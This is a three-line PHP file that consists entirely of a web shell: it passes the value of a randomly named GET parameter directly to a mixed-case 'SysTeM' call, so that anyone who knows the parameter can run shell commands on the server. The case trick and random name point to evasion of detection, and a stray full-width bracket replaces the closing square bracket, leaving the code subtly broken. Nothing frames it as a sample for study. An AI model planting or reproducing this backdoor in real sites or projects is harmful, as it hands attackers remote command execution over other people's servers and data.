<?php
SysTeM($_GET['u6xlkAxS'〕);
?>
